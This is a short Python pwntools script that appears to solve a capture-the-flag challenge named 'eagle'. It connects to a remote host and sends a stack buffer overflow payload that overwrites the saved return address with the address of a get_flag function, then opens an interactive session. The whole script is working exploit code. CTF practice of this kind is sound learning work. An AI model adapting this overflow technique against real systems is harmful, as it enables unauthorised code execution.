#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./eagle')

host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50039)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
io.recvuntil("Avast!\n")

payload = (
    b"A" * 0x48 + # buffer
    b"B" * 0x4 + # EBP
    p32(exe.sym.get_flag)
)
io.sendline(payload)

io.interactive()
